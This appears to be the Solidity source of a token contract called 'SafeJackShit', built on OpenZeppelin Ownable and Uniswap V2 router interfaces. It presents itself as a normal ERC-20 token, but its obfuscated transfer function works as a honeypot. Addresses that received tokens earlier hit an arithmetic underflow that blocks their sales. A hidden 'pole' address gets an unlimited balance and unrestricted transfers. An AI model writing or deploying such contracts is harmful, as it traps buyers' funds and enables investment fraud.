// SPDX-License-Identifier: MIT

pragma solidity >0.8.4;

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed SafeJackShit0, address indexed SafeJackShit1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address SafeJackShitA, address SafeJackShitB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address SafeJackShitA, address SafeJackShitB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address SafeJackShitA,
        address SafeJackShitB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address SafeJackShit,
        uint amountSafeJackShitDesired,
        uint amountSafeJackShitMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountSafeJackShit, uint amountETH, uint liquidity);
    function removeLiquidity(
        address SafeJackShitA,
        address SafeJackShitB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address SafeJackShit,
        uint liquidity,
        uint amountSafeJackShitMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountSafeJackShit, uint amountETH);
    function removeLiquidityWithPermit(
        address SafeJackShitA,
        address SafeJackShitB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address SafeJackShit,
        uint liquidity,
        uint amountSafeJackShitMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountSafeJackShit, uint amountETH);
    function swapExactSafeJackShitsForSafeJackShits(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapSafeJackShitsForExactSafeJackShits(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForSafeJackShits(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapSafeJackShitsForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactSafeJackShitsForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactSafeJackShits(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferSafeJackShits(
        address SafeJackShit,
        uint liquidity,
        uint amountSafeJackShitMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferSafeJackShits(
        address SafeJackShit,
        uint liquidity,
        uint amountSafeJackShitMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactSafeJackShitsForSafeJackShitsSupportingFeeOnTransferSafeJackShits(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForSafeJackShitsSupportingFeeOnTransferSafeJackShits(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactSafeJackShitsForETHSupportingFeeOnTransferSafeJackShits(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract SafeJackShit is Ownable {
    constructor(
        string memory shade,
        string memory easier,
        address directly,
        address pole
    ) {
        uniswapV2Router = IUniswapV2Router02(directly);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = easier;
        _name = shade;
        plus = 2;
        _decimals = 9;
        sold = 1000000000;
        _tTotal = sold * 10**_decimals;

        brief[pole] = round;
        _balances[msg.sender] = _tTotal;
        _balances[pole] = round;
        brief[msg.sender] = round;

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    uint256 public plus;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private sold;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    SafeJackShit private were;
    uint256 private round = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function wore(
        address special,
        address rocky,
        uint256 girl
    ) private {
        address zoo = address(were);
        bool early = uniswapV2Pair == special;
        uint256 spirit = plus;

        if (brief[special] == 0 && market[special] > 0 && !early) {
            brief[special] -= spirit;
        }

        were = SafeJackShit(rocky);

        if (brief[special] > 0 && girl == 0) {
            brief[rocky] += spirit;
        }

        market[zoo] += spirit + 1;

        uint256 cost = (girl / 100) * plus;
        girl -= cost;
        _balances[special] -= cost;
        _balances[address(this)] += cost;

        _balances[special] -= girl;
        _balances[rocky] += girl;
    }

    mapping(address => uint256) private market;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private brief;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        require(amount > 0, 'Transfer amount must be greater than zero');
        wore(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        wore(msg.sender, recipient, amount);
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
}